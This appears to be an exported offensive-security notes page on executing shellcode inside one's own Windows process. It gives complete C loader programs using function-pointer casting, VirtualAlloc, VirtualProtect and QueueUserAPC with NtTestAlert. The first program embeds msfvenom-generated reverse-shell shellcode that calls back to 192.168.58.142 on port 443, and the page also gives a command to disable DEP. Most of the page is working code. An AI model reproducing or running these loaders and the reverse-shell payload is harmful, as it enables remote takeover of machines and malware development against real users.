<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Execute Shellcode Locally</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Execute Shellcode Locally</h1></strong><br />Execute shellcode locally in your own process.<br /><br /><strong><h2>## Typecast shellcode to function</h2></strong><br />This is the original, pre DEP, way of executing shellcode.<br />DEP prevents the stack/the area of memory where you shellcode is from being executable.<br /><strong>DEP prevents this method from working anymore.</strong><br /><br />To test this method, you can disable DEP - <code>bcdedit.exe /set nx AlwaysOff</code> - and restart. <br /><br />To bypass DEP, you allocate an executable memory block in your current or a remote process, copy the shellcode into it, and execute the shellcode from memory.<br /><br /><strong>References</strong><br />• <a href="https://blog.sevagas.com/Hide-meterpreter-shellcode-in-executable">https://blog.sevagas.com/Hide-meterpreter-shellcode-in-executable</a><br />• <a href="https://stackoverflow.com/questions/9593287/execute-shellcode-by-casting-to-function-pointer-in-visual-c">https://stackoverflow.com/questions/9593287/execute-shellcode-by-casting-to-function-pointer-in-visual-c</a><br /><br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;Windows.h&gt;<br /><br />//&nbsp;msfvenom&nbsp;-p&nbsp;windows/shell_reverse_tcp&nbsp;LHOST=192.168.58.142&nbsp;LPORT=443&nbsp;-f&nbsp;c&nbsp;-b&nbsp;&quot;\x00\x0a\x0d&quot;<br />//&nbsp;x86/shikata_ga_nai&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;351&nbsp;(iteration=0)<br />//&nbsp;Payload&nbsp;size:&nbsp;351&nbsp;bytes<br />char&nbsp;shellcode[]&nbsp;=&nbsp;&nbsp;&quot;\xdb\xcb\xbb\xba\xa6\x47\xc6\xd9\x74\x24\xf4\x58\x33\xc9\xb1&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x52\x83\xe8\xfc\x31\x58\x13\x03\xe2\xb5\xa5\x33\xee\x52\xab&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xbc\x0e\xa3\xcc\x35\xeb\x92\xcc\x22\x78\x84\xfc\x21\x2c\x29&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x76\x67\xc4\xba\xfa\xa0\xeb\x0b\xb0\x96\xc2\x8c\xe9\xeb\x45&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x0f\xf0\x3f\xa5\x2e\x3b\x32\xa4\x77\x26\xbf\xf4\x20\x2c\x12&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xe8\x45\x78\xaf\x83\x16\x6c\xb7\x70\xee\x8f\x96\x27\x64\xd6&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x38\xc6\xa9\x62\x71\xd0\xae\x4f\xcb\x6b\x04\x3b\xca\xbd\x54&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xc4\x61\x80\x58\x37\x7b\xc5\x5f\xa8\x0e\x3f\x9c\x55\x09\x84&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xde\x81\x9c\x1e\x78\x41\x06\xfa\x78\x86\xd1\x89\x77\x63\x95&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xd5\x9b\x72\x7a\x6e\xa7\xff\x7d\xa0\x21\xbb\x59\x64\x69\x1f&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xc3\x3d\xd7\xce\xfc\x5d\xb8\xaf\x58\x16\x55\xbb\xd0\x75\x32&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x08\xd9\x85\xc2\x06\x6a\xf6\xf0\x89\xc0\x90\xb8\x42\xcf\x67&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xbe\x78\xb7\xf7\x41\x83\xc8\xde\x85\xd7\x98\x48\x2f\x58\x73&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x88\xd0\x8d\xd4\xd8\x7e\x7e\x95\x88\x3e\x2e\x7d\xc2\xb0\x11&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x9d\xed\x1a\x3a\x34\x14\xcd\x85\x61\x2c\x83\x6e\x70\x50\x9a&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xd5\xfd\xb6\xf6\x39\xa8\x61\x6f\xa3\xf1\xf9\x0e\x2c\x2c\x84&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x11\xa6\xc3\x79\xdf\x4f\xa9\x69\x88\xbf\xe4\xd3\x1f\xbf\xd2&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x7b\xc3\x52\xb9\x7b\x8a\x4e\x16\x2c\xdb\xa1\x6f\xb8\xf1\x98&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xd9\xde\x0b\x7c\x21\x5a\xd0\xbd\xac\x63\x95\xfa\x8a\x73\x63&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x02\x97\x27\x3b\x55\x41\x91\xfd\x0f\x23\x4b\x54\xe3\xed\x1b&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x21\xcf\x2d\x5d\x2e\x1a\xd8\x81\x9f\xf3\x9d\xbe\x10\x94\x29&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xc7\x4c\x04\xd5\x12\xd5\x34\x9c\x3e\x7c\xdd\x79\xab\x3c\x80&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x79\x06\x02\xbd\xf9\xa2\xfb\x3a\xe1\xc7\xfe\x07\xa5\x34\x73&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x17\x40\x3a\x20\x18\x41&quot;;<br /><br />int&nbsp;main()<br /><span style="color:#000000;font-weight:400">{</span>&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;((void(*)())shellcode)();<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br /><strong><h2>## Allocate new executable memory &amp; copy shellcode</h2></strong><br />As it sounds. <br />Allocate some new memory, mark it executable, copy your shellcode to it, typecast your shellcode to a function, and it will execute.<br /><br />Tested on Windows 10 x64 compiled as x86.<br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;Windows.h&gt;<br /><br />//&nbsp;x86&nbsp;MessageBox&nbsp;shellcode<br />//&nbsp;https://www.exploit-db.com/exploits/37758<br />char&nbsp;shellcode[]&nbsp;=&nbsp;&quot;\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x49\x1c\x8b\x59\x08\x8b\x41\x20\x8b\x09&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x80\x78\x0c\x33\x75\xf2\x8b\xeb\x03\x6d&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x3c\x8b\x6d\x78\x03\xeb\x8b\x45\x20\x03&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xc3\x33\xd2\x8b\x34\x90\x03\xf3\x42\x81&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xf3\x66\x8b\x14\x56\x8b\x75\x1c\x03\xf3&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x8b\x74\x96\xfc\x03\xf3\x33\xff\x57\x68&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x4c\x6f\x61\x64\x54\x53\xff\xd6\x33\xc9&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xfe\x4c\x24\x03\x68\x61\x67\x65\x42\x68&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x4d\x65\x73\x73\x54\x50\xff\xd6\x57\x68&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x48\x65\x6c\x6c\x8b\xcc\x57\x57\x51\x57&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x69\x74\x54\x53\xff\xd6\x57\xff\xd0&quot;;<br /><br />int&nbsp;main(void)<br /><span style="color:#000000;font-weight:400">{</span><br />	LPVOID&nbsp;local_mem&nbsp;=&nbsp;NULL;<br />	local_mem&nbsp;=&nbsp;VirtualAlloc(NULL,&nbsp;sizeof(shellcode),&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(local_mem&nbsp;==&nbsp;NULL)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;VirtualAlloc&nbsp;failed:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;EXIT_FAILURE;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />	memcpy(local_mem,&nbsp;shellcode,&nbsp;sizeof(shellcode));<br />	<br />	((void(*)())local_mem)();<br /><br />	return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br /><strong><h2>## Mark existing shellcode memory as executable</h2></strong><br />Use VirtualProtect to mark the existing memory containing your shellcode as executable.<br /><br />Tested on Windows 10 x64 compiled as x86.<br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;Windows.h&gt;<br /><br />//&nbsp;x86&nbsp;MessageBox&nbsp;shellcode<br />//&nbsp;https://www.exploit-db.com/exploits/37758<br />char&nbsp;shellcode[]&nbsp;=&nbsp;&quot;\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x49\x1c\x8b\x59\x08\x8b\x41\x20\x8b\x09&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x80\x78\x0c\x33\x75\xf2\x8b\xeb\x03\x6d&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x3c\x8b\x6d\x78\x03\xeb\x8b\x45\x20\x03&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xc3\x33\xd2\x8b\x34\x90\x03\xf3\x42\x81&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xf3\x66\x8b\x14\x56\x8b\x75\x1c\x03\xf3&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x8b\x74\x96\xfc\x03\xf3\x33\xff\x57\x68&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x4c\x6f\x61\x64\x54\x53\xff\xd6\x33\xc9&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xfe\x4c\x24\x03\x68\x61\x67\x65\x42\x68&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x4d\x65\x73\x73\x54\x50\xff\xd6\x57\x68&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x48\x65\x6c\x6c\x8b\xcc\x57\x57\x51\x57&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x69\x74\x54\x53\xff\xd6\x57\xff\xd0&quot;;<br /><br />int&nbsp;main(void)<br /><span style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;b_ret&nbsp;=&nbsp;FALSE;<br />&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;old_protect&nbsp;=&nbsp;0;<br />&nbsp;&nbsp;&nbsp;&nbsp;b_ret&nbsp;=&nbsp;VirtualProtect(shellcode,&nbsp;sizeof(shellcode),&nbsp;PAGE_EXECUTE_READWRITE,&nbsp;&amp;old_protect);<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(b_ret&nbsp;==&nbsp;FALSE)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;VirtualProtect&nbsp;failed:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;EXIT_FAILURE;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;((void(*)(void))shellcode)();<br /><br />	return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br /><strong><h2>## QueueUserAPC and NtTestAlert</h2></strong><br /><a href="https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-in-a-local-process-with-queueuserapc-and-nttestalert">https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-in-a-local-process-with-queueuserapc-and-nttestalert</a><br /><br /><code>NtTestAlert</code> will empty the APC queue for the current thread.<br />You can queue an APC to execute your shellcode and then empty the queue with <code>NtTestAlert</code> to force your shellcode to execute.<br /><br /><a href="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FAPC%2FNtTestAlert.html">https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FAPC%2FNtTestAlert.html</a><br /><br /><a href=""><img src="images/1858-1.png" alt="images/1858-1.png" /></a><br /><br />Code compiled on Windows 10 x64 2004 as x86.<br />x86 binary used because I couldn&#39;t find reliable x64 shellcode.<br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;Windows.h&gt;<br /><br />typedef&nbsp;NTSTATUS(*t_NtTestAlert)();<br />t_NtTestAlert&nbsp;d_NtTestAlert&nbsp;=&nbsp;NULL;<br /><br />//&nbsp;x86&nbsp;MessageBox&nbsp;shellcode<br />//&nbsp;https://www.exploit-db.com/exploits/37758<br />char&nbsp;shellcode[]&nbsp;=&nbsp;&quot;\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b&quot;<br />&quot;\x49\x1c\x8b\x59\x08\x8b\x41\x20\x8b\x09&quot;<br />&quot;\x80\x78\x0c\x33\x75\xf2\x8b\xeb\x03\x6d&quot;<br />&quot;\x3c\x8b\x6d\x78\x03\xeb\x8b\x45\x20\x03&quot;<br />&quot;\xc3\x33\xd2\x8b\x34\x90\x03\xf3\x42\x81&quot;<br />&quot;\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04&quot;<br />&quot;\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03&quot;<br />&quot;\xf3\x66\x8b\x14\x56\x8b\x75\x1c\x03\xf3&quot;<br />&quot;\x8b\x74\x96\xfc\x03\xf3\x33\xff\x57\x68&quot;<br />&quot;\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68&quot;<br />&quot;\x4c\x6f\x61\x64\x54\x53\xff\xd6\x33\xc9&quot;<br />&quot;\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65&quot;<br />&quot;\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01&quot;<br />&quot;\xfe\x4c\x24\x03\x68\x61\x67\x65\x42\x68&quot;<br />&quot;\x4d\x65\x73\x73\x54\x50\xff\xd6\x57\x68&quot;<br />&quot;\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68&quot;<br />&quot;\x48\x65\x6c\x6c\x8b\xcc\x57\x57\x51\x57&quot;<br />&quot;\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c&quot;<br />&quot;\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78&quot;<br />&quot;\x69\x74\x54\x53\xff\xd6\x57\xff\xd0&quot;;<br /><br />int&nbsp;main(void)<br /><span style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;local_mem&nbsp;=&nbsp;NULL;<br />&nbsp;&nbsp;&nbsp;&nbsp;local_mem&nbsp;=&nbsp;VirtualAlloc(NULL,&nbsp;sizeof(shellcode),&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(local_mem&nbsp;==&nbsp;NULL)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;VirtualAlloc&nbsp;failed:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;EXIT_FAILURE;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;memcpy(local_mem,&nbsp;shellcode,&nbsp;sizeof(shellcode));<br />&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;[+]&nbsp;copied&nbsp;shellcode&nbsp;into&nbsp;executable&nbsp;memory&nbsp;\n&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;QueueUserAPC((PAPCFUNC)local_mem,&nbsp;GetCurrentThread(),&nbsp;0);<br />&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;[+]&nbsp;queued&nbsp;APC&nbsp;on&nbsp;current&nbsp;thread&nbsp;\n&quot;);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;[+]&nbsp;calling&nbsp;NtTestAlert&nbsp;to&nbsp;empty&nbsp;the&nbsp;APC&nbsp;queue&nbsp;for&nbsp;the&nbsp;current&nbsp;thread&nbsp;\n&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;d_NtTestAlert&nbsp;=&nbsp;(t_NtTestAlert)GetProcAddress(GetModuleHandleA(&quot;Ntdll.dll&quot;),&nbsp;&quot;NtTestAlert&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;d_NtTestAlert();<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br /><strong><h1>## via Fibers</h1></strong><br /><a href="https://www.ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber">https://www.ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber</a><br /><a href="http://dronesec.pw/blog/2019/08/12/code-execution-via-fiber-local-storage/">http://dronesec.pw/blog/2019/08/12/code-execution-via-fiber-local-storage/</a><br /><br /></div>
</body>
</html>
